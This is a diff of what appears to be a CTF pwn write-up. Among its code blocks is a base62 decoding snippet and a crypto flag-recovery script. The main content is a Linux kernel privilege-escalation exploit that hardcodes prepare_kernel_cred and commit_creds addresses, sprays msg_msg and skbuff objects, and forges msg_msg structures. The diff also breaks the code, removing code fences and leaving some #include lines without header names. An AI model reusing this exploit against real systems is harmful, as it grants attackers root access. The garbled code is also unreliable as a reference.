@@ -58,22 +58,12 @@ pwn557  
 ```
 CHARSET_DEFAULT = "9876543210qwertyuiopasdfghjklzxcvbnmMNBVCXZLKJHGFDSAPOIUYTREWQ"
 CHARSET_INVERTED = "9876543210qwertyuiopasdfghjklzxcvbnmMNBVCXZLKJHGFDSAPOIUYTREWQ"
-```
-
-
-
-```
 import base62
 import string
 
 str1 = "7dFRjPItGFkeXAALp6GMKE9Y4R4BuNtIUK1RECFlU4f3PomCzGnfemFvO"
 
 print (base62.decodebytes(str1))
-```
-
-
-
-```
 from Crypto.Util.number import *
 import random
 '''
@@ -111,7 +101,7 @@ for each in data:
     if "enc =" in each:
         enc += [eval(each[6:])]
 
-#print(enc[0])
+    #print(enc[0])
 a="110011001101100011000010110011101111011"
 
 puseful = []
@@ -141,11 +131,6 @@ for i in range(len(puseful)):
         if pow(encs[j],(pp-1)//2,pp) != 1:
             flag[j] = 0
     print(bytes.fromhex((hex(int((''.join(str(f) for f in flag))[::-1],2))[2:])))
-```
-
-
-
-```
 typedef struct {
     unsigned long long num;
     void *ptr;
@@ -163,49 +148,44 @@ void del(){
     arg.num = 0;
     ioctl(fd,0x30,&arg);    //del
 }
-```
+    #define _GNU_SOURCE
+    #include <err.h>
+    #include <errno.h>
+    #include <fcntl.h>
+    #include 
+    #include <sched.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include 
+    #include <net/if.h>
+    #include <netinet/in.h>
+    #include <sys/ipc.h>
+    #include <sys/msg.h>
+    #include <sys/socket.h>
+    #include <sys/syscall.h>
+    #define MSG_COPY        040000
+    #define PAGE_SIZE 0x1000
+    #define PRIMARY_SIZE 0x1000
+    #define SECONDARY_SIZE 0x400
 
+    #define NUM_SOCKETS 4
+    #define NUM_SKBUFFS 128
+    #define NUM_PIPEFDS 256
+    #define NUM_MSQIDS 4096
 
+    #define HOLE_STEP 1024
 
-```
-#define _GNU_SOURCE
-#include <err.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <inttypes.h>
-#include <sched.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <net/if.h>
-#include <netinet/in.h>
-#include <sys/ipc.h>
-#include <sys/msg.h>
-#include <sys/socket.h>
-#include <sys/syscall.h>
-#define MSG_COPY        040000
-#define PAGE_SIZE 0x1000
-#define PRIMARY_SIZE 0x1000
-#define SECONDARY_SIZE 0x400
-
-#define NUM_SOCKETS 4
-#define NUM_SKBUFFS 128
-#define NUM_PIPEFDS 256
-#define NUM_MSQIDS 4096
-
-#define HOLE_STEP 1024
-
-#define MTYPE_PRIMARY 0x41
-#define MTYPE_SECONDARY 0x42
-#define MTYPE_FAKE 3
+    #define MTYPE_PRIMARY 0x41
+    #define MTYPE_SECONDARY 0x42
+    #define MTYPE_FAKE 3
 
 size_t user_cs, user_ss, user_rflags, user_sp;
 unsigned long long int base = 0xffffffff8203ed80;
 unsigned long long int addr_base;
 unsigned long long int canary;
 
-#define KERNCALL __attribute__((regparm(3)))
+    #define KERNCALL __attribute__((regparm(3)))
 void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810c99d0;
 void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810c9540;
 
@@ -288,8 +268,8 @@ struct msg_msg {
  void *security;
 };
 
-#define MSG_MSG_SIZE (sizeof(struct msg_msg))
-#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))
+    #define MSG_MSG_SIZE (sizeof(struct msg_msg))
+    #define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))
 struct {
   long mtype;
   char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];
@@ -357,8 +337,8 @@ void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
   msg->security = 0;
 }
 
-#define NUM_SOCKETS 10
-#define NUM_SKBUFFS 128
+    #define NUM_SOCKETS 10
+    #define NUM_SKBUFFS 128
 int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
   for (int i = 0; i < NUM_SOCKETS; i++) {
     for (int j = 0; j < NUM_SKBUFFS; j++) {
